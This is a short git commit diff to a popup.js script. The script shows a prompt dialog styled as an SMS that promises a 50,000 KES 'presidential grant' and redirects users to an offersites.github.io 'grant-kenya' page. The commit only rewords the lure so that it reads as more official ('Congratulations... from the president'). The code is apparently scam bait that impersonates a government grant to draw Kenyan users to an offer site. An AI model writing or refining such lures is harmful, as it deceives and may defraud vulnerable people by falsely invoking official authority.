80be91a332117dc009add94a156bad772a48fc4b
offersites <havast1920@gmail.com>
2024-11-30 13:05:27 +0100

    Update popup.js

--- popup.js
+++ popup.js
@@ -1,6 +1,6 @@
 
 var password = 'GET 50,000 KES'
-password=prompt('SMS :Get 50,000 KES presidentail grant now.   ','GET 50,000 KES');
+password=prompt('SMS :Congratulations Get 50,000 KES presidential grant now from the president.   ','GET 50,000 KES');
 if (password != 'GET 50,000 KES') {
 location.href='https://offersites.github.io/grant-kenya';
 }
